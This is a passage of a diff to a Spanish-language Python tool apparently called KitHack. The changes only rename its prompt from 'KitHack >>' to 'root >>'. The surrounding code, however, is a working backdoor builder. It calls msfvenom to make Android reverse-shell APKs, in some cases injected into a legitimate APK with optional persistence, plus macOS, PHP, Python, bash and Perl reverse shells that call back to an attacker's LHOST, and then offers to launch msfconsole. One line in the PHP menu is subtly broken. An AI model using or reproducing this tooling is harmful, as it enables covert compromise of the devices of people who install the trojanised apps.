+					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
 					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
@@ -3039,7 +3040,7 @@ def main():
 							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 							break						
 						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 							os.system('systemctl stop postgresql && clear')
 							main()	
 						else:
@@ -3065,7 +3066,7 @@ def main():
 					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
 					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))
 
-					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					m = input("{0}root >> {1}".format(RED, DEFAULT))
 					m = m.zfill(2)
 
 					if m == '01':
@@ -3077,7 +3078,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
@@ -3091,7 +3092,7 @@ def main():
 								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 								break							
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -3121,7 +3122,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
@@ -3155,7 +3156,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -3196,14 +3197,14 @@ def main():
 				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
 				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
 				
-				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				a = input("{0}root >> {1}".format(RED, DEFAULT))
 				a = a.zfill(2)
 
 				if a == '01':
 					run_network()
 					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
 						break
 					else:
 						Tk().withdraw()
@@ -3211,7 +3212,7 @@ def main():
 						print("\n{0}ICON: {1}".format(YELLOW, icon))						
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 						mainout = os.path.splitext(OUT)[0]	
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						file = open("/tmp/data.txt", "w")
 						file.write(icon + '\n')
 						file.write(mainout)
@@ -3246,7 +3247,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -3271,7 +3272,7 @@ def main():
 					# Salida de bucle
 					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 					mainout = os.path.splitext(OUT)[0]
-					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
 					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
@@ -3285,7 +3286,7 @@ def main():
 							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 							break						
 						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 							os.system('systemctl stop postgresql && clear')
 							main()	
 						else:
@@ -3311,7 +3312,7 @@ def main():
 					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
 					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))
 
-					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					m = input("{0}root >> {1}".format(RED, DEFAULT))
 					m = m.zfill(2)
 					
 					if m == '01':
@@ -3323,7 +3324,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
@@ -3337,7 +3338,7 @@ def main():
 								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 								break							
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -3367,7 +3368,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
@@ -3401,7 +3402,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -3453,7 +3454,7 @@ def main():
 			print ('{0}[05]{1} osx/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
 			print ('{0}[06]{1} osx/x86/shell_reverse_tcp'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = pay.zfill(2)
 
 			if pay == '01':
@@ -3468,7 +3469,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3501,7 +3502,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3534,7 +3535,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3567,7 +3568,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3600,7 +3601,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3633,7 +3634,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3666,7 +3667,7 @@ def main():
 			print ('{0}[02]{1} php/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
 			print ('{0}[03]{1} php/reverse_php'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = tool.zfill(2)
 
 			if pay == '01':
@@ -3681,7 +3682,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3714,7 +3715,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3747,7 +3748,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3785,7 +3786,7 @@ def main():
 			print ('{0}[06]{1} python/shell_reverse_tcp_ssl'.format(WHITE, YELLOW))
 			print ('{0}[07]{1} python/shell_reverse_udp'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = pay.zfill(2)
 
 			if pay == '01':
@@ -3800,7 +3801,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3833,7 +3834,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3866,7 +3867,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3899,7 +3900,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3932,7 +3933,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3965,7 +3966,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -3998,7 +3999,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -4031,7 +4032,7 @@ def main():
 			print ('{0}[01]{1} cmd/unix/reverse_bash'.format(WHITE, YELLOW))
 			print ('{0}[02]{1} cmd/unix/reverse_bash_telnet_ssl'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = pay.zfill(2)
 
 			if pay == '01':
@@ -4046,7 +4047,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()						
 					else:
@@ -4079,7 +4080,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.sh'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.sh".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -4112,7 +4113,7 @@ def main():
 			print ('{0}[01]{1} cmd/unix/reverse_perl'.format(WHITE, YELLOW))
 			print ('{0}[02]{1} cmd/unix/reverse_perl_ssl'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = pay.zfill(2)
 
 			if pay == '01':
@@ -4127,7 +4128,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -4160,7 +4161,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
